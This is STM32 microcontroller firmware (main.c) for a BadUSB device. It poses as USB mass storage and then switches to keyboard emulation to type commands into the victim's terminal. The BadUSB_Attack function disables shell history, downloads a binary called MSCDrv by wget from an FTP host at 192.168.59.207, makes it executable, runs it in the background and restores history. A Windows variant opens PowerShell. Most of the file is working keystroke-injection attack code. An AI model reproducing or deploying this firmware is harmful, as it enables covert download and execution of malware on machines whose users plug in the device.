/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * Copyright (c) 2024 STMicroelectronics.
  * All rights reserved.
  *
  * This software is licensed under terms that can be found in the LICENSE file
  * in the root directory of this software component.
  * If no LICENSE file comes with this software, it is provided AS-IS.
  *
  ******************************************************************************
  */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "spi.h"
#include "tim.h"
#include "usart.h"
#include "usb_device.h"
#include "gpio.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include "usbd_customhid.h"
#include "usb_device_MSC.h"
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */
/**Full key conflict free descriptor:
 *-----------------------------------------------------------------------------
 * Descriptor length:73Bytes
 * ____________________________________________________________________________
 *| Send Bytes Num:15Bytes                                                     |
 *| buffer[0] - bit0: Left CTRL                                                |
 *|           - bit1: Left SHIFT                                               |
 *|           - bit2: Left ALT                                                 |
 *|           - bit3: Left GUI                                                 |
 *|           - bit4: Right CTRL                                               |
 *|           - bit5: Right SHIFT                                              |
 *|           - bit6: Right ALT                                                |
 *|           - bit7: Right GUI                                                |
 *| buffer[1] - Padding = Always 0x00                                          |
 *| buffer[2] - (A & a) ~ (H & h)                                              |
 *| buffer[3] - (I & i) ~ (P & p)                                              |
 *| buffer[4] - (Q & q) ~ (X & x)                                              |
 *| buffer[5] - (Y & y) ~ (Z & z) | 1 ~ 6                                      |
 *| buffer[6] - 7 ~ 0 | Enter | Esc | Backspace | Tab                          |
 *|** This is the number key 1 ~ 0 in the main keyboard area                   |
 *| buffer[7] - Space | - | = | [ | ] | \ | \ | ;                              |
 *| buffer[8] - ' | ` | , | . | / | CapsLock | F1 ~ F2                         |
 *| buffer[9] - F3 ~ F10                                                       |
 *| buffer[A] - F11 ~ F12 | PRTSRC | ScrollLock | Pause | Insert | Home | PgUp |
 *| buffer[B] - Delete | End | PgDn | Right | Left | Down | Up | NumLock       |
 *| buffer[C] - / | * | - | + | Enter | 1 ~ 3                                  |
 *| buffer[D] - 4 ~ 0 | .                                                      |
 *|** This is the number key 1 ~ 0 in the numeric keypad area                  |
 *| buffer[E] - (Keypad 6) ~ (Keyboard Application)                            |
 *|____________________________________________________________________________|
 *| Recv Bytes Num:1Bytes                                                      |
 *| buffer[0] - bit0: Num Lock       //States of Num Lock LED                  |
 *|           - bit1: Caps Lock      //States of Caps Lock LED                 |
 *|           - bit2: Scroll Lock    //States of Scroll Lock LED               |
 *|           - bit3: Compose        //States of Compose LED                   |
 *|           - bit4: Kana           //States of Kana LED                      |
 *|           - bit5-7: Additional LED                                         |                                              |
 *|____________________________________________________________________________|
 *-----------------------------------------------------------------------------
 **Following is the mapping from:
 *| [ASCII code characters] to [corresponding keyboard descriptors]
 * ____________________________________________________________________________
 *|        From ASCII to Keyboard descriptors Mapping Table                    |
 *| 1. This is a mapping in [half-width] + [lowercase] mode                    |
 *| 2. The upper four bits are the (buffer index:Ah[from 0 to 15]),            |
 *| 3. the highest bit of the lower four bits is                               |
 *|    whether to use the control key shift(Bh+8h/Bh+0h),                      |
 *| 4. and the remaining three bits are the                                    |
 *|    (byte numbers:Bh[from 0h to 7h])                                        |
 *|    corresponding to                                                        |
 *|    the descriptor of the ASCII character in the buffer array index         |
 *| 5. map[ASCII] = 0x(A)(B/B+8)                                               |
 *| 6. map[0]-[127] is standard mapping from ASCII to its descriptor           |
 *|    map[128]-[]  is Customize keyboard shortcuts to its descriptor:         |
 *|        (1).map[128]: Capslock's descriptor                                 |
 *|        (2).map[129]: Backspace's descriptor                                |
 *|        (3).map[130]: Ctrl's descriptor                                     |
 *|        (4).map[131]: Alt's descriptor                                      |
 *|        Linux start Terminal(Ctrl + Alt + T)                                |
 *|        (5).map[132]: GUI's descriptor (Win)                                |
 *|        Windows start Terminal(Win + R)                                     |
 *|        (6).map[133]: NumLock's descriptor                                  |
 *|____________________________________________________________________________|
  uint8_t map[134]={
  		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x70, 0x5a, 0x88, 0x5c, 0x5d, 0x5e, 0x68, 0x80,
  		0x6a, 0x6b, 0x69, 0x7a, 0x82, 0x71, 0x83, 0x84,
  		0x63, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x60,
  		0x61, 0x62, 0x7f, 0x77, 0x8a, 0x72, 0x8b, 0x8c,
  		0x5b, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e,
  		0x2f, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e,
  		0x3f, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e,
  		0x4f, 0x58, 0x59, 0x73, 0x75, 0x74, 0x5f, 0x79,
  		0x81, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26,
  		0x27, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
  		0x37, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46,
  		0x47, 0x50, 0x51, 0x7b, 0x7d, 0x7c, 0x89, 0xb0,
  		0x85,     //ASCII[128]:Capslock
  		0x66,     //ASCII[129]:Backspace
  		0x00,     //ASCII[130]:Ctrl
  		0x02,     //ASCII[131]:Alt
  		0x03,     //ASCII[132]:GUI
  		0xb7,     //ASCII[133]:NumLock
  };
 *-----------------------------------------------------------------------------
 **Following are the descriptor set in Function:
 *                CUSTOM_HID_ReportDesc_FS in usbd_custom_hid_if.c
 //  0x05, 0x01,                    // USAGE_PAGE (Generic Desktop)//73U
 //  0x09, 0x06,                    // USAGE (Keyboard)
 //  0xa1, 0x01,                    // COLLECTION (Application)
 //  0x05, 0x07,                    //   USAGE_PAGE (Keyboard)
 //  0x19, 0xe0,                    //   USAGE_MINIMUM (Keyboard LeftControl)
 //  0x29, 0xe7,                    //   USAGE_MAXIMUM (Keyboard Right GUI)
 //  0x15, 0x00,                    //   LOGICAL_MINIMUM (0)
 //  0x25, 0x01,                    //   LOGICAL_MAXIMUM (1)
 //  0x95, 0x08,                    //   REPORT_COUNT (8)
 //  0x75, 0x01,                    //   REPORT_SIZE (1)
 //  0x81, 0x02,                    //   INPUT (Data,Var,Abs)
 //  0x95, 0x01,                    //   REPORT_COUNT (1)
 //  0x75, 0x08,                    //   REPORT_SIZE (8)
 //  0x81, 0x03,                    //   INPUT (Cnst,Var,Abs)
 //  0x05, 0x07,                    //   USAGE_PAGE (Keyboard)
 //  0x19, 0x04,                    //   USAGE_MINIMUM (Keyboard a and A)
 //  0x29, 0x65,                    //   USAGE_MAXIMUM (Keyboard Application)
 //  0x15, 0x00,                    //   LOGICAL_MINIMUM (0)
 //  0x25, 0x01,                    //   LOGICAL_MAXIMUM (1)
 //  0x95, 0x62,                    //   REPORT_COUNT (98)
 //  0x75, 0x01,                    //   REPORT_SIZE (1)
 //  0x81, 0x02,                    //   INPUT (Data,Var,Abs)
 //  0x95, 0x01,                    //   REPORT_COUNT (1)
 //  0x75, 0x06,                    //   REPORT_SIZE (6)
 //  0x81, 0x03,                    //   INPUT (Cnst,Var,Abs)
 //  0x05, 0x08,                    //   USAGE_PAGE (LEDs)
 //  0x19, 0x01,                    //   USAGE_MINIMUM (Num Lock)
 //  0x29, 0x05,                    //   USAGE_MAXIMUM (Kana)
 //  0x15, 0x00,                    //   LOGICAL_MINIMUM (0)
 //  0x25, 0x01,                    //   LOGICAL_MAXIMUM (1)
 //  0x95, 0x05,                    //   REPORT_COUNT (5)
 //  0x75, 0x01,                    //   REPORT_SIZE (1)
 //  0x91, 0x02,                    //   OUTPUT (Data,Var,Abs)
 //  0x95, 0x01,                    //   REPORT_COUNT (1)
 //  0x75, 0x03,                    //   REPORT_SIZE (3)
 //  0x91, 0x03,                    //   OUTPUT (Cnst,Var,Abs)
 //  0xc0                           // END_COLLECTION
 *----------------------------------------------------------------------------
 **Following are init steps about this Project:
 * 1. usbd_conf.h: //can modify to USER CODE position
 *    #define USBD_CUSTOM_HID_REPORT_DESC_SIZE     73U
 *    #define USBD_CUSTOMHID_OUTREPORT_BUF_SIZE    15U
 *    #define USBD_CUSTOMHID_INREPORT_BUF_SIZE     01U
 * 2. usbd_customhid.h:
 *    #ifndef USBD_CUSTOMHID_OUTREPORT_BUF_SIZE
 *    #define USBD_CUSTOMHID_OUTREPORT_BUF_SIZE  0x0fU //15Bytes
 *    #endif  //USBD_CUSTOMHID_OUTREPORT_BUF_SIZE
 *    #ifndef USBD_CUSTOMHID_INREPORT_BUF_SIZE
 *    #define USBD_CUSTOMHID_INREPORT_BUF_SIZE   01U   //1Bytes
 *    #endif  //USBD_CUSTOMHID_INREPORT_BUF_SIZE
 *    #ifndef USBD_CUSTOM_HID_REPORT_DESC_SIZE
 *    #define USBD_CUSTOM_HID_REPORT_DESC_SIZE   73U   //73Bytes
 *    #endif  //USBD_CUSTOM_HID_REPORT_DESC_SIZE
 * 3. usbd_customhid.c:
 *    USB CUSTOM_HID device FS Configuration Descriptor:
 *        Descriptor of CUSTOM HID interface:
 *            0x01,  //nInterfaceProtocol : 0=none, 1=keyboard, 2=mouse
 * 4. usbd_custom_hid_if.c:
 *    Modify your code to USER CODE position:
 *    (1).Referencing external variables:
 *        (1).if stm32f0xx:
 *            extern uint8_t recv_buffer[USBD_CUSTOMHID_INREPORT_BUF_SIZE];
 *            extern int InterruptFlag;
 *            extern USBD_HandleTypeDef hUsbDeviceFS;
 *        (2).if stm32l4xx:
 *            Skip this step;
 *    (2).Fill in custom keyboard device descriptors
 *    (3).Customize Callback function:[CUSTOM_HID_OutEvent_FS]
 *        Which deals with received data from host.
 *        (1).stm32f0xx:Add following codes
 *        (2).stm32l4xx:Add following codes in file:[usbd_customhid.c]
 *            In function USBD_CUSTOM_HID_ReceivePacket:
 *        //definition:
 *          extern uint8_t recv_buffer[USBD_CUSTOMHID_INREPORT_BUF_SIZE];
 *          extern int InterruptFlag;
 *        //After func USBD_LL_PrepareReceive in USBD_CUSTOM_HID_ReceivePacket
 *        / *USBD_CUSTOMHID_INREPORT_BUF_SIZE is always 1,
 *          * Copy hhid->Report_buf[0] directly to recv_buffer[0]
 *          * By judging conditions,
 *          * Aiming to eliminating loop operations:
 *          * for(int i = 0; i < USBD_CUSTOMHID_INREPORT_BUF_SIZE; i++)
 *          *     recv_buffer[i] = hhid->Report_buf[i];
 *          * /
 *          if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 *              InterruptFlag = 1;
 *          }
 * 5. stm32l4xx_hal_pcd.c/stm32f0xx_hal_pcd.c:
 *    (1).Add these external declarations at the beginning of this file:
 *        #define USBD_CUSTOMHID_INREPORT_BUF_SIZE 1
 *        extern uint8_t recv_buffer[USBD_CUSTOMHID_INREPORT_BUF_SIZE];
 *        extern int InterruptFlag;
 *        extern int NeedRollBack;
 *    (2).In function: HAL_StatusTypeDef HAL_PCD_EP_Transmit();(line 2049)
 *        Add following codes **before** USB_EPStartXfer function:
 *            //Determine whether to generate an interrupt:
 *            if((recv_buffer[0]&0x02) != 0x02)
 *                InterruptFlag = 1;
 *        Add following codes **after** USB_EPStartXfer function:
 *            //Output test to choose whether to RollBack:
 *            if((recv_buffer[0]&0x02) != 0x02)
 *                NeedRollBack = 1;
 *----------------------------------------------------------------------------*/
/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */

/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/

/* USER CODE BEGIN PV */
extern USBD_HandleTypeDef hUsbDeviceFS;
extern int isMSC;
/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
/* USER CODE BEGIN PFP */

/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */
#define FPGA       1
#define Desktop    2
#define Target     FPGA

/*You can adjust following configure Slot:
 * to ensure the the correctness and stability of the output*/
#if Target == FPGA
  #define StrokeSlot 35
  #define PlugSlot 50
  #define ShortcutSlot 1000
  #define SwitchDeviceSlot 3000
  #define TestHIDSlot 1000
  #define InjectStringSlot 1000
#elif Target == Desktop
  #define StrokeSlot 35
  #define PlugSlot 50
  #define ShortcutSlot 500
  #define SwitchDeviceSlot 1000
  #define TestHIDSlot 500
  #define InjectStringSlot 1000
#endif

uint8_t sent_buffer[USBD_CUSTOMHID_OUTREPORT_BUF_SIZE];

uint8_t recv_buffer[USBD_CUSTOMHID_INREPORT_BUF_SIZE];

#define MapLen 134
#define Map_Init {\
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\
0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00, 0x00,\
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\
0x70, 0x5a, 0x88, 0x5c, 0x5d, 0x5e, 0x68, 0x80,\
0x6a, 0x6b, 0x69, 0x7a, 0x82, 0x71, 0x83, 0x84,\
0x63, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x60,\
0x61, 0x62, 0x7f, 0x77, 0x8a, 0x72, 0x8b, 0x8c,\
0x5b, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e,\
0x2f, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e,\
0x3f, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e,\
0x4f, 0x58, 0x59, 0x73, 0x75, 0x74, 0x5f, 0x79,\
0x81, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26,\
0x27, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,\
0x37, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46,\
0x47, 0x50, 0x51, 0x7b, 0x7d, 0x7c, 0x89, 0xb0,\
0x85, 0x66, 0x00, 0x02, 0x03, 0xb7, \
}\

#define LinuxTerminal {130, 131, 'T'}
#define WindowsTerminal {132, 'R'}

int InterruptFlag = 0;
int InterruptCnt = 0;
int PrintCnt = 0;
int NeedRollBack = 0;

void SimulateUSB_unplug();
void SimulateUSB_plugin();
void SwitchToHID();
void SwitchToMSC();
void Get_Single_Descriptor(uint8_t ascii);
void Get_Multi_Descriptor(uint8_t *array, int num);
void SimulateKeyPress(uint8_t ascii);
void SimulateKeyRelease();
void SimulateKeyStroke(uint8_t ascii);
void SimulateShortcutKey(uint8_t *array, int num);
void SimulateKeyStrokes(char *str, int len, int *cntNow);
void PrintRecvBuf(uint8_t Recv_Buf[USBD_CUSTOMHID_INREPORT_BUF_SIZE]);
void InitKeyboardStatus();
void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]);
void InterruptTrap(int *InterruptFlag);
int TestHID();
void BadUSB_Attack(int stage);

/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */

  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_USART2_UART_Init();
  MX_SPI1_Init();
  /* USER CODE BEGIN 2 */
  int flag = 0;
  isMSC = 1;
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  flag = 1;
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
	  switch(flag){
	  case 1:
		  //random slot to switch HID
		  HAL_Delay(10000);
		  while(1){
			  if(!Flash_Busy){
				  SwitchToHID();
				  while(!TestHID())
					  HAL_Delay(TestHIDSlot);
				  //Attack begin
				  BadUSB_Attack(0);
				  break;
			  }
		  }
#if Target == FPGA
		  flag = 2;
#elif Target == Desktop
		  flag = 0;
#endif
		  SwitchToMSC();
		  break;
	  case 2:
		  //random slot to wait download complete
		  HAL_Delay(20000);
		  while(1){
			  if(!Flash_Busy){
				  SwitchToHID();
				  BadUSB_Attack(1);
				  break;
			  }
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
	  }

  }
  /* USER CODE END WHILE */
  /* USER CODE BEGIN 3 */
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
  {
    Error_Handler();
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
  RCC_OscInitStruct.MSICalibrationValue = 0;
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
  RCC_OscInitStruct.PLL.PLLM = 1;
  RCC_OscInitStruct.PLL.PLLN = 24;
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
  {
    Error_Handler();
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
}

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
}

void SimulateUSB_plugin(){
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
}

void SwitchToHID(){
	SimulateUSB_unplug();
	isMSC = 0;
	HAL_Delay(PlugSlot);
	SimulateUSB_plugin();
	MX_TIM2_Init();
	MX_USB_DEVICE_Init();
	HAL_Delay(SwitchDeviceSlot);
}

void SwitchToMSC(){
	SimulateUSB_unplug();
	isMSC = 1;
	HAL_Delay(PlugSlot);
	SimulateUSB_plugin();
	MX_USB_DEVICE_Init_MSC();
	HAL_Delay(SwitchDeviceSlot);
}

void Get_Single_Descriptor(uint8_t ascii){
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	uint8_t Map[MapLen] = Map_Init;
	Convert2CapsMap(Map);
	uint8_t pos = Map[ascii];
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
	if((pos&0x08) == 8)
		sent_buffer[0] |= 0x02;
}

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	uint8_t Map[MapLen] = Map_Init;
	Convert2CapsMap(Map);
	for(int i = 0; i < num; i++){
		uint8_t pos = Map[array[i]];
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
		if((pos&0x08) == 8)
			sent_buffer[0] |= 0x02;
	}
}

void SimulateKeyPress(uint8_t ascii){
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
}

void SimulateKeyRelease(){
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
}

void SimulateKeyStroke(uint8_t ascii){
	SimulateKeyPress(ascii);
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
	SimulateKeyRelease();
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
}

void SimulateShortcutKey(uint8_t *array, int num){
	Get_Multi_Descriptor(array, num);
	while((recv_buffer[0]&0x02) != 0x02){
		SimulateKeyStroke(128);
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
	SimulateKeyRelease();
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
}

void SimulateKeyStrokes(char *str, int len, int *cntNow){
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
			SimulateKeyStroke(128);
    	}
		SimulateKeyStroke(str[*cntNow]);
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
			NeedRollBack = 0;
			(*cntNow)--;
			SimulateKeyStroke(129);
		}
	}
}

void PrintRecvBuf(uint8_t Recv_Buf[USBD_CUSTOMHID_INREPORT_BUF_SIZE]){
	HAL_Delay(StrokeSlot);
	for(int i = 0; i < USBD_CUSTOMHID_INREPORT_BUF_SIZE; i++){
		for(int j = 0; j < 8; j++){
			SimulateKeyStroke(((Recv_Buf[i]&(uint8_t)(0x01<<j))>>j)+'0');
		}
	}
	SimulateKeyStroke('\n');
}

void InitKeyboardStatus(){//Convert keyboard to uppercase mode
	SimulateKeyStroke(128);
	HAL_Delay(StrokeSlot);
	if((recv_buffer[0]&0x02) != 0x02){
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
		LowerCaseMap[cnt] &= 0xf7;
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
	}
}

void InterruptTrap(int *InterruptFlag){
	if(*InterruptFlag == 1){
		*InterruptFlag = 0;
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
		//Second entry interrupt
		MX_TIM2_Init();
		HAL_TIM_Base_Start_IT(&htim2);
	}
}

int TestHID(){
	char testStr[4] = {133, 133, 133, 133};
	SimulateKeyStroke(133);
	uint8_t PrevState = recv_buffer[0]&0x01;
	SimulateKeyStrokes(testStr, 4, &PrintCnt);
	uint8_t CurrState = recv_buffer[0]&0x01;
	return PrevState == CurrState;
}

void BadUSB_Attack(int stage){
#if Target == FPGA
	if(stage == 0){
		uint8_t Terminal[3] = LinuxTerminal;
		char AttackStr0[256] = {'\0'};
		strcat(AttackStr0, "set +o history\n");
		strcat(AttackStr0, "cd /home/user/Templates\n");
		strcat(AttackStr0, "wget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\n");
		strcat(AttackStr0, "exit\n");
		SimulateShortcutKey(Terminal, 3);
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
	}else if(stage == 1){
		uint8_t Terminal[3] = LinuxTerminal;
		char AttackStr1[256] = {'\0'};
		strcat(AttackStr1, "cd /home/user/Templates\n");
		strcat(AttackStr1, "chmod 777 MSCDrv\n");
		strcat(AttackStr1, "./MSCDrv >/dev/null 2>&1 &\n");
		strcat(AttackStr1, "set -o history\n");
		strcat(AttackStr1, "exit\n");
		SimulateShortcutKey(Terminal, 3);
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#elif Target == Desktop
	if(stage == 0){
		uint8_t Terminal[2] = WindowsTerminal;
		char AttackStr[256], AttackStr1[256];
		strcpy(AttackStr, "powershell\n");
		strcpy(AttackStr1, "ls\n\nexit\n");
		SimulateShortcutKey(Terminal, 2);
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
		HAL_Delay(InjectStringSlot);
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
	if(htim == &htim2){
		if(InterruptCnt == 0){
			//Simulate press operation
			Get_Single_Descriptor(128);
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
			//Simulate release operation
			SimulateKeyRelease();
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
				InterruptCnt = -1;
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
		}
		InterruptCnt = (InterruptCnt+1)%3;
	}
}

void HAL_GPIO_EXTI_Callback(uint16_t GPIO_Pin){
	if(GPIO_Pin == GPIO_PIN_6){//Key_Pin
//		HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
	}
}

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
  {
  }
  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */
